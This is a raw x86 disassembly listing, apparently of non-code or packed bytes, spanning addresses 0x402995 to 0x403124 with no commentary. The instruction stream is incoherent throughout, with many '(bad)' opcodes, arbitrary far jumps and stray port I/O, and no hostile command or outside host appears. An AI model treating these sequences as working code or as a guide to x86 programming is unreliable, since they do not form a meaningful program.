  402995:	pop    edi
  402996:	cmp    ecx,ebp
  402998:	adc    edx,edi
  40299a:	xchg   esp,eax
  40299b:	add    esi,esp
  40299d:	mov    DWORD PTR [edi-0x65],ecx
  4029a0:	out    0xbb,al
  4029a2:	retf   
  4029a3:	imul   edx,DWORD PTR [edi-0x68],0x63
  4029a7:	or     al,0xfb
  4029a9:	(bad)  
  4029aa:	ror    BYTE PTR [ecx+0x2d04807d],0x93
  4029b1:	and    BYTE PTR [ebx],0xa5
  4029b4:	in     eax,dx
  4029b5:	ja     0x4029bc
  4029b7:	adc    ecx,DWORD PTR [ebx]
  4029b9:	xchg   edx,eax
  4029ba:	out    0x53,eax
  4029bc:	pop    ecx
  4029bd:	and    edi,DWORD PTR [esi]
  4029bf:	(bad)  
  4029c0:	push   ebp
  4029c1:	ins    BYTE PTR es:[edi],dx
  4029c2:	or     ax,0x452f
  4029c6:	push   esi
  4029c7:	jns    0x402a16
  4029c9:	inc    eax
  4029ca:	mov    ds,WORD PTR [esp+esi*1+0x3675b141]
  4029d1:	cmp    al,0xcf
  4029d3:	mov    ds:0x8a2cbf4f,al
  4029d8:	mov    WORD PTR [ebx+0x6f6d5cd5],ss
  4029de:	outs   dx,BYTE PTR ds:[esi]
  4029df:	pop    es
  4029e0:	add    al,bh
  4029e2:	xor    bl,ah
  4029e4:	call   0x4f30:0xdae3c5ab
  4029eb:	test   BYTE PTR [esi+0x1a294e53],cl
  4029f1:	push   edi
  4029f2:	cmp    BYTE PTR [edx],0xf1
  4029f5:	test   al,0x58
  4029f7:	xchg   BYTE PTR [edi+ecx*8+0x24],bh
  4029fb:	cmp    al,0x37
  4029fd:	(bad)  
  4029fe:	fadd   QWORD PTR [ebx]
  402a00:	xchg   ebx,eax
  402a01:	enter  0x6ade,0x9e
  402a05:	sbb    dh,bl
  402a07:	inc    ebp
  402a08:	push   0xffffffee
  402a0a:	push   esi
  402a0b:	xor    DWORD PTR [eax],0xffffffb2
  402a0e:	(bad)  
  402a0f:	rol    BYTE PTR [eax],0xa4
  402a12:	addr16 (bad) 
  402a14:	test   al,0x43
  402a16:	pop    ebx
  402a17:	dec    ecx
  402a18:	or     BYTE PTR [esp+ecx*1+0x52288ecd],ch
  402a1f:	sar    DWORD PTR ds:0x8df8,0xc7
  402a25:	rcr    BYTE PTR gs:[eax-0x23],1
  402a29:	jle    0x4029cb
  402a2b:	dec    eax
  402a2c:	std    
  402a2d:	mov    edi,0x22f915c7
  402a32:	cld    
  402a33:	add    eax,0xd422047b
  402a38:	or     eax,0x9d2413a9
  402a3d:	sbb    ah,BYTE PTR [ecx-0x74]
  402a40:	imul   edx,ebx,0xd375d6b
  402a46:	or     DWORD PTR [ebx+0x1],ecx
  402a49:	or     edi,DWORD PTR fs:[ebp+0x2c604d48]
  402a50:	jle    0x402a14
  402a52:	sbb    edi,esi
  402a54:	out    0x8c,eax
  402a56:	mov    esi,0xd422d1cd
  402a5b:	xor    eax,0x96f88e77
  402a60:	hlt    
  402a61:	dec    ecx
  402a62:	repnz dec edx
  402a64:	out    dx,eax
  402a65:	mov    ecx,0x9b77e934
  402a6a:	aam    0xc9
  402a6c:	imul   edi,DWORD PTR [edi-0x1c8d2276],0x31
  402a73:	clc    
  402a74:	ret    
  402a75:	add    edx,DWORD PTR [edx+ebx*2]
  402a78:	fnstenv [edi+0x6793c54e]
  402a7e:	idiv   edx
  402a80:	into   
  402a81:	shl    DWORD PTR [ebx],1
  402a83:	xor    DWORD PTR [ecx],edx
  402a85:	xchg   esp,eax
  402a86:	push   esi
  402a87:	mov    dh,0x24
  402a89:	mov    ebp,esp
  402a8b:	fs push eax
  402a8d:	dec    ebx
  402a8e:	fild   DWORD PTR [ebx]
  402a90:	pop    eax
  402a91:	enter  0xf1ee,0xfd
  402a95:	dec    esi
  402a96:	push   ecx
  402a97:	jmp    0x402a75
  402a99:	add    BYTE PTR [ecx-0x5a52b375],cl
  402a9f:	or     al,0xaa
  402aa1:	out    0x14,al
  402aa3:	inc    edi
  402aa4:	dec    esp
  402aa5:	jp     0x402a54
  402aa7:	sbb    ecx,esi
  402aa9:	cmp    eax,0x7f8eac8
  402aae:	stc    
  402aaf:	sbb    bl,BYTE PTR [edx-0x5d]
  402ab2:	sub    BYTE PTR [ebp-0x3f],ah
  402ab5:	stos   DWORD PTR es:[edi],eax
  402ab6:	xlat   BYTE PTR ds:[ebx]
  402ab7:	dec    ecx
  402ab8:	and    dl,BYTE PTR [ebx]
  402aba:	xchg   DWORD PTR [ebx],ebx
  402abc:	adc    ecx,DWORD PTR [edx]
  402abe:	xchg   ebp,eax
  402abf:	repz xor BYTE PTR [eax+0x5d],ch
  402ac3:	sbb    al,0x84
  402ac5:	jnp    0x402a87
  402ac7:	and    BYTE PTR [edi+0x39],0x13
  402acb:	xchg   esp,eax
  402acc:	imul   edx,DWORD PTR [ecx-0x7c],0x2a
  402ad0:	xor    eax,DWORD PTR [ebp-0x36]
  402ad3:	or     cl,bl
  402ad5:	cli    
  402ad6:	xchg   ecx,eax
  402ad7:	mov    dl,0x3f
  402ad9:	inc    esi
  402ada:	gs aad 0x6f
  402add:	pushf  
  402ade:	sbb    dl,dl
  402ae0:	fwait
  402ae1:	stos   BYTE PTR es:[edi],al
  402ae2:	rcl    DWORD PTR [edx],cl
  402ae4:	jae    0x402aef
  402ae6:	(bad)  
  402ae7:	xlat   BYTE PTR ds:[ebx]
  402ae8:	jne    0x402b1b
  402aea:	iret   
  402aeb:	loop   0x402aa7
  402aed:	call   0x41cabbd2
  402af2:	aaa    
  402af3:	mov    ds:0x3ef491a1,eax
  402af8:	aas    
  402af9:	pop    ebx
  402afa:	fstp   QWORD PTR [esi+0x1f]
  402afd:	sub    bl,0x42
  402b00:	or     ch,cl
  402b02:	jmp    0x7e3:0x1e0c4aa2
  402b09:	iret   
  402b0a:	or     BYTE PTR [ecx-0xe810ae9],0x44
  402b11:	loopne 0x402b86
  402b13:	ins    DWORD PTR es:[edi],dx
  402b14:	pop    eax
  402b15:	jbe    0x402b58
  402b17:	test   BYTE PTR [ebx+0x49],dl
  402b1a:	pop    ds
  402b1b:	ret    0x6490
  402b1e:	fbld   TBYTE PTR [esi+0x15]
  402b21:	xor    BYTE PTR [ebx+0x4ab4b739],dh
  402b27:	pop    edx
  402b28:	mov    dh,0x8d
  402b2a:	es aas 
  402b2c:	jp     0x402bac
  402b2e:	mov    esi,0xd7dab917
  402b33:	mov    cl,0xa0
  402b35:	adc    eax,0x16076ec4
  402b3a:	push   esi
  402b3b:	ins    DWORD PTR es:[edi],dx
  402b3c:	in     al,dx
  402b3d:	add    DWORD PTR [ecx-0x77],ecx
  402b40:	and    DWORD PTR [edx-0xc1a283b],edi
  402b46:	adc    al,0xea
  402b48:	push   edx
  402b49:	pop    ebx
  402b4a:	xor    BYTE PTR [ebp+0x70adb952],dl
  402b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b51:	sbb    cl,BYTE PTR ds:0xd3bca0eb
  402b57:	push   ebp
  402b58:	retf   0x92d1
  402b5b:	lahf   
  402b5c:	rcr    BYTE PTR [esp+edx*4+0x33bd978c],cl
  402b63:	inc    edi
  402b64:	daa    
  402b65:	out    0x7e,eax
  402b67:	and    edx,DWORD PTR [esi+0x4b0a47be]
  402b6d:	mov    WORD PTR [ebx+0x59],?
  402b70:	or     ebx,eax
  402b72:	cdq    
  402b73:	or     ebp,DWORD PTR [ecx+0x50880d1d]
  402b79:	push   es
  402b7a:	dec    ebp
  402b7b:	push   cs
  402b7c:	ror    BYTE PTR [eax+0x17],1
  402b7f:	jge    0x402b60
  402b81:	mov    bh,0xd7
  402b83:	sbb    BYTE PTR [edi+0x53],dh
  402b86:	mov    bh,al
  402b88:	addr16 inc ecx
  402b8a:	mov    edx,0xe9f73960
  402b8f:	mov    dl,0x9b
  402b91:	mov    al,dl
  402b93:	inc    ecx
  402b94:	mov    ebp,DWORD PTR [esi-0x50]
  402b97:	mov    ecx,esi
  402b99:	iret   
  402b9a:	scas   eax,DWORD PTR es:[edi]
  402b9b:	ja     0x402c19
  402b9d:	adc    BYTE PTR [ebp+0x29],cl
  402ba0:	mov    edx,?
  402ba2:	loop   0x402b80
  402ba4:	sub    DWORD PTR fs:[ecx+0xe],edx
  402ba8:	enter  0x18a3,0xe6
  402bac:	xchg   BYTE PTR [eax+0x65],dl
  402baf:	pop    ecx
  402bb0:	cwde   
  402bb1:	mov    cl,0xdd
  402bb3:	aaa    
  402bb4:	dec    edx
  402bb5:	mov    ebx,0x1ed11fa5
  402bba:	fwait
  402bbb:	add    edi,DWORD PTR [ebx+0x55894629]
  402bc1:	in     eax,dx
  402bc2:	lds    esp,FWORD PTR [esi]
  402bc4:	pop    ebx
  402bc5:	push   cs
  402bc6:	adc    al,0xfb
  402bc8:	sti    
  402bc9:	repz scas eax,DWORD PTR es:[edi]
  402bcb:	adc    cl,0xc
  402bce:	sbb    BYTE PTR [esi],0x53
  402bd1:	cwde   
  402bd2:	xlat   BYTE PTR ds:[ebx]
  402bd3:	cli    
  402bd4:	dec    esp
  402bd5:	push   es
  402bd6:	pop    ds
  402bd7:	cli    
  402bd8:	sub    al,0x7c
  402bda:	leave  
  402bdb:	out    dx,al
  402bdc:	repnz in eax,0x11
  402bdf:	sub    eax,0xe469ac1b
  402be4:	dec    BYTE PTR ds:0x1c9e4f4f
  402bea:	jo     0x402bd1
  402bec:	sub    DWORD PTR ds:0x3cf2b8f6,esi
  402bf2:	pop    esp
  402bf3:	lea    esi,[ecx+0x4]
  402bf6:	iret   
  402bf7:	pop    ecx
  402bf8:	mov    dl,0x1
  402bfa:	push   ebx
  402bfb:	mov    dh,0x18
  402bfd:	and    al,BYTE PTR [ecx+0x64]
  402c00:	mov    WORD PTR [ecx-0x5b29d912],?
  402c06:	dec    edx
  402c07:	out    dx,al
  402c08:	jne    0x402be8
  402c0a:	loopne 0x402ba7
  402c0c:	adc    dh,dh
  402c0e:	push   ebp
  402c0f:	out    dx,al
  402c10:	cs cs retf 0x6da
  402c15:	repnz lods eax,DWORD PTR fs:[esi]
  402c18:	dec    ebx
  402c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c1a:	cmp    al,0x7f
  402c1c:	jb     0x402c93
  402c1e:	sub    eax,0xfae2fe6c
  402c23:	arpl   WORD PTR [eax+0x6],dx
  402c26:	xchg   BYTE PTR [edi-0x78],ah
  402c29:	push   ebx
  402c2a:	rep outs dx,DWORD PTR ds:[esi]
  402c2c:	dec    eax
  402c2d:	dec    eax
  402c2e:	rcr    BYTE PTR [ebx],0xb7
  402c31:	pop    ss
  402c32:	jg     0x402c4c
  402c34:	dec    DWORD PTR ss:0x497f4b91
  402c3b:	lods   al,BYTE PTR ds:[esi]
  402c3c:	mov    eax,0x14c32138
  402c41:	scas   eax,DWORD PTR es:[edi]
  402c42:	in     eax,0xb1
  402c44:	in     al,dx
  402c45:	lds    esi,FWORD PTR [edx+eiz*4]
  402c48:	sbb    esp,esi
  402c4a:	inc    ebx
  402c4b:	ror    ch,cl
  402c4d:	lods   eax,DWORD PTR ds:[esi]
  402c4e:	push   eax
  402c4f:	pop    ebx
  402c50:	retf   0xbb89
  402c53:	in     eax,dx
  402c54:	lahf   
  402c55:	mov    bl,0xdc
  402c57:	sbb    eax,0x43313289
  402c5c:	mov    dh,0x51
  402c5e:	inc    eax
  402c5f:	and    bh,BYTE PTR [edi-0x1]
  402c62:	fisub  DWORD PTR [edi]
  402c64:	dec    eax
  402c65:	dec    edx
  402c66:	adc    DWORD PTR [edi+0x9],eax
  402c69:	mov    al,ds:0xaf4db7d5
  402c6e:	nop
  402c6f:	fsubr  QWORD PTR [edi+edi*2+0x1c47252]
  402c76:	dec    esp
  402c77:	push   ss
  402c78:	int    0xd5
  402c7a:	test   DWORD PTR [edi+eiz*4],ebx
  402c7d:	mov    esi,0xe78cb0fc
  402c82:	dec    esi
  402c83:	jb     0x402cea
  402c85:	(bad)  
  402c86:	arpl   bp,si
  402c88:	or     DWORD PTR [edi+0xe],edx
  402c8b:	pop    ebx
  402c8c:	call   0x8451:0x393c8708
  402c93:	adc    al,0xc0
  402c95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c96:	(bad)  
  402c97:	mov    ebp,0x454f820b
  402c9c:	xor    BYTE PTR [ebx+0x169023eb],bl
  402ca2:	(bad)  
  402ca3:	stc    
  402ca4:	mov    esp,0xecab2225
  402caa:	imul   ebp,DWORD PTR [edx-0x76],0x15
  402cae:	mov    BYTE PTR [ebx],ah
  402cb0:	mov    bl,0x1a
  402cb2:	cld    
  402cb3:	push   ebx
  402cb4:	jmp    0xb709:0x5c69431e
  402cbb:	mov    ch,BYTE PTR ds:0x6384e560
  402cc1:	add    cl,BYTE PTR [edi-0x38f90d18]
  402cc7:	iret   
  402cc8:	add    bh,bh
  402cca:	fwait
  402ccb:	outs   dx,DWORD PTR ds:[esi]
  402ccc:	lods   eax,DWORD PTR ds:[esi]
  402ccd:	and    cl,BYTE PTR [eax-0x690365bb]
  402cd3:	das    
  402cd4:	cmp    eax,0x2bde1f93
  402cd9:	or     al,0x91
  402cdb:	rol    DWORD PTR [ebx+0x4518c656],cl
  402ce1:	pusha  
  402ce2:	mov    esi,0xb3dbbd11
  402ce7:	fdivp  st(1),st
  402ce9:	lds    edi,FWORD PTR [esi-0x1bb369bc]
  402cef:	aam    0x34
  402cf1:	mov    edi,0x9c65440b
  402cf6:	mov    cl,BYTE PTR [edx]
  402cf8:	imul   edx,DWORD PTR [eax-0x101f63c2],0xffffff8a
  402cff:	std    
  402d00:	pop    ss
  402d01:	dec    ebp
  402d02:	lds    edi,FWORD PTR [ecx]
  402d04:	and    ebx,DWORD PTR cs:[edx]
  402d07:	adc    DWORD PTR [ebp+eiz*4-0x42dd0fd7],esp
  402d0e:	add    esi,eax
  402d10:	fisttp DWORD PTR [edx+0x61]
  402d13:	test   al,0x49
  402d16:	jecxz  0x402d1e
  402d18:	call   0xdf60:0x4e4449af
  402d1f:	push   ecx
  402d20:	sbb    DWORD PTR [ebp+0x5feebba0],edx
  402d26:	push   cs
  402d27:	loope  0x402d63
  402d29:	repnz and ax,0x1d70
  402d2e:	push   0xffffffec
  402d30:	add    DWORD PTR [eax+0x258505d4],ebp
  402d36:	cmp    eax,DWORD PTR [edi]
  402d38:	jo     0x402d0e
  402d3a:	jg     0x402cee
  402d3c:	out    dx,eax
  402d3d:	retf   0x87ce
  402d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d41:	and    esp,DWORD PTR [eax+0x5e]
  402d44:	lea    edi,[ecx]
  402d46:	mov    edx,0x735a8937
  402d4b:	(bad)  
  402d4d:	das    
  402d4e:	sub    eax,0x4b6520bb
  402d53:	dec    edx
  402d54:	lea    ebx,[ebx+0x75f59b01]
  402d5a:	ror    DWORD PTR [ebx-0x712258ed],1
  402d60:	popa   
  402d61:	retf   
  402d62:	add    ah,dh
  402d64:	test   eax,0x10ee87e3
  402d69:	mov    ?,WORD PTR [ebp-0x42]
  402d6c:	ja     0x402deb
  402d6e:	lods   eax,DWORD PTR ds:[esi]
  402d6f:	pop    edi
  402d70:	loopne 0x402d4f
  402d72:	push   cs
  402d73:	in     al,dx
  402d74:	and    bl,BYTE PTR [ebx-0x15833aa9]
  402d7a:	loop   0x402d47
  402d7c:	jb     0x402d8d
  402d7e:	jecxz  0x402d44
  402d80:	cmp    eax,0x3fb47a6a
  402d85:	cmp    DWORD PTR [esi-0x7],ebx
  402d88:	sahf   
  402d89:	sbb    bl,BYTE PTR [eax-0x64]
  402d8c:	rol    ebx,cl
  402d8e:	sti    
  402d8f:	icebp  
  402d90:	pusha  
  402d91:	sar    DWORD PTR [esp+esi*2-0x10],1
  402d95:	out    dx,eax
  402d96:	jnp    0x402d6f
  402d98:	lods   al,BYTE PTR ds:[esi]
  402d99:	daa    
  402d9a:	js     0x402df6
  402d9c:	fst    QWORD PTR [esi-0x15]
  402d9f:	clc    
  402da0:	mul    DWORD PTR [eax+edi*2]
  402da3:	sbb    BYTE PTR [ebp-0x626193bf],ch
  402da9:	fisub  WORD PTR [esi-0x53]
  402dac:	imul   edi,ecx,0xb
  402daf:	(bad)  
  402db0:	ret    
  402db1:	scas   eax,DWORD PTR es:[edi]
  402db2:	sbb    al,0x4c
  402db4:	ja     0x402d6c
  402db6:	cmp    BYTE PTR [eax+esi*4-0x56],dl
  402dba:	adc    DWORD PTR [ebp-0x68453e34],edx
  402dc0:	cld    
  402dc1:	mov    eax,ds:0xeb9dd154
  402dc6:	push   ds
  402dc7:	(bad)  [edx]
  402dc9:	das    
  402dca:	lea    esp,[ebx+ecx*8+0x9a24759]
  402dd1:	xor    eax,DWORD PTR [esi+0x7bbde2c6]
  402dd7:	shl    BYTE PTR [ecx+0x77ae7995],1
  402ddd:	and    BYTE PTR [esi-0x7],cl
  402de0:	or     ebp,esp
  402de2:	inc    ebp
  402de3:	and    edx,edi
  402de5:	mov    ds:0xf4908fa8,al
  402dea:	adc    eax,0x33c8a239
  402def:	loop   0x402ddb
  402df1:	in     al,0x8b
  402df3:	cli    
  402df4:	loop   0x402deb
  402df6:	out    0xc,eax
  402df8:	push   ebx
  402df9:	ret    0x874f
  402dfc:	imul   ebx,DWORD PTR [ecx-0x45eec47c],0x196415ab
  402e06:	xchg   ebx,eax
  402e07:	outs   dx,DWORD PTR ds:[esi]
  402e08:	dec    esi
  402e09:	mov    ds:0x25c6d4ed,eax
  402e0e:	pop    ebx
  402e0f:	clc    
  402e10:	jmp    0x281d:0xcfc48f99
  402e17:	sbb    DWORD PTR [esi-0x4d],ebx
  402e1a:	ret    
  402e1b:	and    BYTE PTR [edi+0x3b],0x86
  402e1f:	pop    ebx
  402e20:	pop    edi
  402e21:	outs   dx,DWORD PTR ds:[esi]
  402e22:	(bad)  
  402e23:	xchg   edi,eax
  402e24:	jmp    0x94d0:0xbdc45307
  402e2b:	add    ah,BYTE PTR [edi]
  402e2d:	test   BYTE PTR [esp+edx*8],dl
  402e30:	je     0x402df8
  402e32:	push   esp
  402e33:	leave  
  402e34:	mov    bh,0x9c
  402e36:	addr16 fs popf 
  402e39:	aam    0x6e
  402e3b:	mov    ah,0xd
  402e3d:	mov    BYTE PTR [ecx-0x2],ah
  402e40:	sahf   
  402e41:	stos   BYTE PTR es:[edi],al
  402e42:	cwde   
  402e43:	cmc    
  402e44:	retf   0x828b
  402e47:	shl    DWORD PTR [ecx+0x35],cl
  402e4a:	(bad)  
  402e4b:	pop    ecx
  402e4c:	jne    0x402e5a
  402e4e:	mov    esi,?
  402e50:	hlt    
  402e51:	test   eax,0x56e07750
  402e56:	fwait
  402e57:	cld    
  402e58:	cmp    dh,bl
  402e5a:	lods   al,BYTE PTR ds:[esi]
  402e5b:	dec    ebp
  402e5c:	mov    cl,0xf9
  402e5e:	pop    esi
  402e5f:	out    dx,eax
  402e60:	fisttp QWORD PTR [edx+0xd]
  402e63:	inc    ebx
  402e64:	inc    esi
  402e65:	(bad)  
  402e66:	mov    dl,BYTE PTR [eax-0x7d]
  402e69:	push   ss
  402e6a:	sbb    dh,ah
  402e6c:	nop
  402e6d:	hlt    
  402e6e:	ja     0x402e35
  402e70:	cmp    edx,eax
  402e72:	mov    dl,0x90
  402e74:	cmp    eax,0x106a2c81
  402e79:	loope  0x402e6a
  402e7b:	cli    
  402e7c:	cmp    al,0xea
  402e7e:	jo     0x402e97
  402e80:	in     eax,dx
  402e81:	test   BYTE PTR [eax+0x6b778452],cl
  402e87:	test   al,0xa4
  402e89:	jecxz  0x402ed8
  402e8b:	ja     0x402e6d
  402e8d:	cmp    DWORD PTR [esi-0x4f3ca054],esi
  402e93:	cmp    eax,0x4c71708a
  402e98:	sub    ch,dl
  402e9a:	rcl    DWORD PTR [esi+0x21c30a5b],0x66
  402ea1:	enter  0x16af,0xa9
  402ea5:	adc    al,dl
  402ea7:	push   ds
  402ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ea9:	jp     0x402eae
  402eab:	sub    ah,al
  402ead:	les    ebp,FWORD PTR [edi-0xaa9e65]
  402eb3:	cmp    bl,BYTE PTR ds:0xfe8335d4
  402eb9:	outs   dx,BYTE PTR ds:[esi]
  402eba:	sub    al,0xbb
  402ebc:	push   edx
  402ebd:	imul   esi,DWORD PTR ds:0x72a8b323,0xffffffc5
  402ec4:	test   BYTE PTR [edx+edi*1],ch
  402ec7:	or     al,0x6a
  402ec9:	iret   
  402eca:	repz inc esi
  402ecc:	aad    0xb1
  402ece:	push   0xffffff8c
  402ed0:	and    BYTE PTR [esi+0x3abdc545],dh
  402ed6:	mov    DWORD PTR [edi],ebp
  402ed8:	xchg   ebx,eax
  402ed9:	outs   dx,DWORD PTR ds:[esi]
  402eda:	neg    cl
  402edc:	repnz mov esi,0x24277d51
  402ee2:	mov    ah,0x72
  402ee4:	push   es
  402ee5:	push   esp
  402ee6:	das    
  402ee7:	cwde   
  402ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ee9:	xchg   edi,eax
  402eea:	in     al,0xf0
  402eec:	add    edx,DWORD PTR [esi-0x56]
  402eef:	or     ah,BYTE PTR [eax-0x4e7d6717]
  402ef5:	arpl   WORD PTR [ebp-0x5c],si
  402ef8:	out    dx,al
  402ef9:	cli    
  402efa:	lds    eax,FWORD PTR [ebx+edi*8-0x44be0506]
  402f01:	or     DWORD PTR [edx],esi
  402f03:	(bad)  
  402f04:	sbb    al,0xa7
  402f06:	scas   al,BYTE PTR es:[edi]
  402f07:	mov    ds:0xcaa3aadc,eax
  402f0c:	or     dl,BYTE PTR [esi+0x2e]
  402f0f:	xor    BYTE PTR [ecx-0xed2ee88],dl
  402f15:	dec    ebp
  402f16:	int    0x20
  402f18:	test   eax,0x6ceaf5b3
  402f1d:	es imul ebp,eax,0x2
  402f21:	mov    ebx,0xef9f464
  402f26:	sbb    dl,BYTE PTR [eax]
  402f28:	mov    edx,0x1d449466
  402f2d:	push   cs
  402f2e:	xchg   edx,eax
  402f2f:	lea    ebp,[esi-0x64]
  402f32:	iret   
  402f33:	std    
  402f34:	pop    DWORD PTR [ebp-0x4]
  402f37:	sub    al,0xdf
  402f39:	mov    eax,ds:0x4a6788a6
  402f3e:	jmp    0x7b7:0x887a8ed1
  402f45:	shl    DWORD PTR [ecx+0x32],cl
  402f48:	loop   0x402f17
  402f4a:	cmp    al,0xeb
  402f4c:	in     eax,dx
  402f4d:	mov    esi,0x9f725dbb
  402f52:	call   0x62f:0x90a9849b
  402f59:	(bad)  
  402f5a:	ficomp WORD PTR [ecx+0x52]
  402f5d:	mov    eax,0xce4c42db
  402f62:	inc    esp
  402f63:	jmp    0x6464:0x418b90ac
  402f6a:	rol    DWORD PTR [ebx+0x7a],0x85
  402f6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f6f:	clc    
  402f70:	xlat   BYTE PTR ds:[ebx]
  402f71:	leave  
  402f72:	push   es
  402f73:	loopne 0x402efa
  402f75:	xor    BYTE PTR fs:[ebp-0x4c],ah
  402f79:	and    eax,esi
  402f7b:	jbe    0x402fef
  402f7d:	in     eax,dx
  402f7e:	sti    
  402f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f80:	and    al,0x9c
  402f82:	ja     0x402fb9
  402f84:	sbb    DWORD PTR [edx+0x1b],eax
  402f87:	outs   dx,DWORD PTR ds:[esi]
  402f88:	sti    
  402f89:	sahf   
  402f8a:	fwait
  402f8b:	add    edx,ebx
  402f8d:	pop    ecx
  402f8e:	push   ds
  402f8f:	mov    ch,0xea
  402f91:	test   BYTE PTR [ebp-0x27bc7eae],ch
  402f97:	into   
  402f98:	and    esp,DWORD PTR [edi+0x6b493daa]
  402f9e:	jmp    0x92e91ac4
  402fa3:	mov    al,ds:0xcd0a9e0a
  402fa8:	fst    DWORD PTR [ebx+edi*2]
  402fab:	sub    al,0x45
  402fad:	imul   ebp,DWORD PTR [edi+0x704d15a1],0x6
  402fb4:	outs   dx,BYTE PTR ds:[esi]
  402fb5:	cld    
  402fb6:	ror    BYTE PTR [esi+0x71],cl
  402fb9:	or     al,0x6d
  402fbb:	aad    0x4c
  402fbd:	not    BYTE PTR [esi]
  402fbf:	iret   
  402fc0:	aaa    
  402fc1:	into   
  402fc2:	pop    edi
  402fc3:	mov    esi,0x51ab3867
  402fc8:	or     al,0xc6
  402fcb:	dec    edi
  402fcc:	je     0x402fbf
  402fce:	push   ds
  402fcf:	(bad)  
  402fd0:	ret    0xded2
  402fd3:	and    ebx,edx
  402fd5:	or     eax,0x8a74dfd5
  402fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fdb:	jmp    0xaa4f:0x6cc3e74
  402fe2:	test   al,0x98
  402fe4:	cmc    
  402fe5:	fist   DWORD PTR [esi]
  402fe7:	adc    eax,DWORD PTR [ecx+0x7f]
  402fea:	xchg   esp,eax
  402feb:	mov    dl,0x38
  402fed:	mov    esi,DWORD PTR [edi]
  402fef:	sbb    eax,ebx
  402ff1:	test   eax,0x4c45a489
  402ff6:	and    esi,0x45b7505b
  402ffc:	ins    BYTE PTR es:[edi],dx
  402ffd:	sub    BYTE PTR [si-0x3e66],cl
  403002:	repz xchg ecx,eax
  403004:	xlat   BYTE PTR ds:[ebx]
  403005:	mov    ds:0x301b47d6,al
  40300a:	sub    al,BYTE PTR [ecx]
  40300c:	data16 ds fprem1 
  403010:	jnp    0x403060
  403012:	pxor   mm0,QWORD PTR [edx+eiz*4-0x3e]
  403017:	test   BYTE PTR [esi+0x21],dl
  40301a:	mov    ah,0x4f
  40301c:	pusha  
  40301d:	pop    es
  40301e:	daa    
  40301f:	sub    esp,edx
  403021:	pop    ebx
  403022:	into   
  403023:	cmp    al,0xa7
  403025:	cmp    eax,0x664e87f2
  40302a:	jb     0x403094
  40302c:	jne    0x403022
  40302e:	adc    al,0x2d
  403030:	out    dx,al
  403031:	xor    edi,DWORD PTR [ecx]
  403033:	sbb    DWORD PTR [edx+0x7574ae21],edx
  403039:	mov    ch,0x8c
  40303b:	ss pop eax
  40303d:	xlat   BYTE PTR ds:[ebx]
  40303e:	ret    0x63a4
  403041:	aam    0x34
  403043:	pop    edi
  403044:	or     eax,0x3e6eba9b
  403049:	pop    edx
  40304a:	ins    BYTE PTR es:[edi],dx
  40304b:	or     eax,0xbf29170e
  403050:	or     BYTE PTR [esi+0x5d584264],dl
  403056:	or     BYTE PTR [esi],ah
  403058:	push   eax
  403059:	or     esp,DWORD PTR [edx+edx*2]
  40305c:	cmp    DWORD PTR [ebp+ebx*4-0x54],ebp
  403060:	pop    ss
  403061:	xchg   esp,eax
  403062:	(bad)  
  403063:	icebp  
  403064:	mov    ebx,0xd31465f1
  403069:	cdq    
  40306a:	shld   DWORD PTR [esi+edx*4-0x57],edi,cl
  40306f:	xchg   esi,eax
  403070:	push   0x564eabeb
  403075:	fwait
  403076:	adc    DWORD PTR [eax-0x18],esp
  403079:	xlat   BYTE PTR ds:[ebx]
  40307a:	inc    eax
  40307b:	push   edi
  40307c:	(bad)  
  40307d:	mov    bl,0xe3
  40307f:	mov    ecx,ebp
  403081:	data16 sahf 
  403083:	push   ebp
  403084:	xchg   ecx,eax
  403085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403086:	mov    bl,0xe7
  403088:	adc    eax,0xa7ebe360
  40308d:	outs   dx,BYTE PTR ds:[esi]
  40308e:	(bad)
  403091:	ret    0x7674
  403094:	push   edx
  403095:	repnz fcom QWORD PTR [ebx-0x2a]
  403099:	cwde   
  40309a:	fwait
  40309b:	mov    eax,DWORD PTR [edi+0x6210da61]
  4030a1:	pushf  
  4030a2:	mov    bl,0xe6
  4030a4:	mov    ebx,0xb7d548c1
  4030a9:	sub    BYTE PTR [edx],bl
  4030ab:	push   ecx
  4030ac:	call   FWORD PTR [eax+esi*2-0x3ea0b905]
  4030b3:	aad    0x88
  4030b5:	mov    ebp,0xe369fb69
  4030ba:	ja     0x403125
  4030bc:	add    ebx,DWORD PTR [ebx-0x62]
  4030bf:	xor    ebx,DWORD PTR ds:0x6db62966
  4030c5:	cmp    eax,0xaf1fca2c
  4030ca:	mov    ah,0xc2
  4030cc:	and    BYTE PTR [esi-0x50],cl
  4030cf:	mov    edi,0x8417861d
  4030d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030d5:	ja     0x4030b3
  4030d7:	pop    ebx
  4030d8:	test   al,0x91
  4030da:	and    al,0xef
  4030dc:	pop    edi
  4030dd:	or     BYTE PTR [edx-0x162b8ab6],al
  4030e3:	jmp    0x6a41e160
  4030e8:	mov    eax,0x39f47e1a
  4030ed:	sbb    al,0x11
  4030ef:	cmp    al,0xa2
  4030f1:	push   esi
  4030f2:	xchg   ebx,eax
  4030f3:	pop    ss
  4030f4:	test   eax,0xeb86d148
  4030f9:	and    BYTE PTR [edx],cl
  4030fb:	pop    esp
  4030fc:	je     0x403173
  4030fe:	test   al,0x9b
  403100:	gs aad 0x40
  403103:	push   0xffffffe4
  403105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403106:	(bad)  
  403107:	int    0x5b
  403109:	or     DWORD PTR [ebx+eax*2],ebp
  40310c:	lods   eax,DWORD PTR ds:[esi]
  40310d:	pop    edx
  40310e:	jb     0x403139
  403110:	jns    0x403094
  403112:	outs   dx,DWORD PTR ds:[esi]
  403113:	rcl    BYTE PTR [edi],cl
  403115:	stc    
  403116:	or     al,BYTE PTR [edi-0x2f456f67]
  40311c:	or     al,0x21
  40311e:	adc    edi,DWORD PTR [eax]
  403120:	lock dec sp
  403123:	dec    edx
  403124:	sbb    BYTE PTR [eax+eax*8],0xf6
